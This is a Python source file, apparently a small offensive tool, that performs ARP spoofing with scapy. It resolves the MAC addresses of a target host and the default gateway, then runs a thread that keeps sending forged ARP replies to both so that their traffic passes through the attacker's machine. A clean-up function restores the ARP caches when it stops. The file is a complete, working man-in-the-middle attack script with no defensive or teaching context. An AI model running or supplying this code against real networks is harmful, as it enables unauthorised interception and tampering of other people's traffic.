from threading import Thread
from scapy.all import *
import netifaces as ni


stop = 1


def ARP_poison(target_ip, gateway_ip, target_mac, gateway_mac, mac):
    print("[*] ARP poisoning...")

    try:
        global stop
        while stop:
            send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=mac, hwdst=target_mac), verbose=0)
            send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=mac, hwdst=gateway_mac), verbose=0)
    except Exception as e:
        print(str(e))
    finally:
        clean_up(target_ip, gateway_ip, target_mac, gateway_mac)
        print("[*] ARP poisoning has ended")


def clean_up(target_ip, gateway_ip, target_mac, gateway_mac):
    print("[*] Cleaning arp cache...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=gateway_mac, hwdst=target_mac),
         verbose=0)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=target_mac, hwdst=gateway_mac),
         verbose=0)


def arpspoof(target_ip, interface):
    #target_ip = "192.168.0.31"

    if interface not in ni.interfaces():
        print("No such network interface: " + interface)
        exit(-1)
    host_ip = ni.ifaddresses(interface)[2][0]['addr']
    host_mac = ni.ifaddresses(interface)[ni.AF_LINK][0]['addr']

    gws = ni.gateways()
    gateway_ip = gws['default'][ni.AF_INET][0]

    print("[*] Getting MAC address of default gateway...")
    pkt = sr1(ARP(op=ARP.who_has, psrc=host_ip, pdst=gateway_ip), verbose=0, retry=30)
    gateway_mac = pkt[ARP].hwsrc
    if gateway_mac is None:
        print("[*] Could not get MAC address of default gateway")
        exit(-1)

    print("[*] Getting MAC address of target...")
    pkt = sr1(ARP(op=ARP.who_has, psrc=host_ip, pdst=target_ip), verbose=0, retry=30)
    target_mac = pkt[ARP].hwsrc
    if target_mac is None:
        print("[*] Could not get MAC address of target")
        exit(-1)

    print("\tHost IP: ", host_ip)
    print("\tHost MAC: ", host_mac)
    print("\tDefault gateway IP: ", gateway_ip)
    print("\tDefault gateway MAC: ", gateway_mac)
    print("\tTarget IP: ", target_ip)
    print("\tTarget MAC: ", target_mac)

    arp_poison = Thread(target=ARP_poison, args=(target_ip, gateway_ip, target_mac, gateway_mac, host_mac))
    arp_poison.start()

